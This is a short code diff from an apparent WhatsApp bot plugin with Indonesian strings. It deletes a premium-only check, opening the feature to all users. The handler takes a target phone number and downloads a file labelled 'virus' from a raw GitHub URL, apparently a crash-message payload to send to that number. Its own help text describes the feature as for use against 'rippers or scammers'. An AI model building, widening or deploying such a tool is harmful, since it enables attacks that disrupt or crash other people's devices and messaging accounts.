@@ -6,7 +6,6 @@ import { sticker } from '../lib/sticker.js'
 const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = pkg
 
 let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
-    if (global.db.data.users[m.sender].premiumTime < 1) return conn.sendButtonDoc(m.chat, `𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐏𝐑𝐄𝐌𝐈𝐔𝐌!!`, botdate, '𝐁𝐮𝐲 𝐏𝐫𝐞𝗺𝐢𝐮𝗺', '.sewabot', m, adReply)
 	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nGunaka Fitur Hanya Untuk Ripper Atau Scamer`)
 	let thumb = fs.readFileSync('./thumbnail.jpg')
 	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
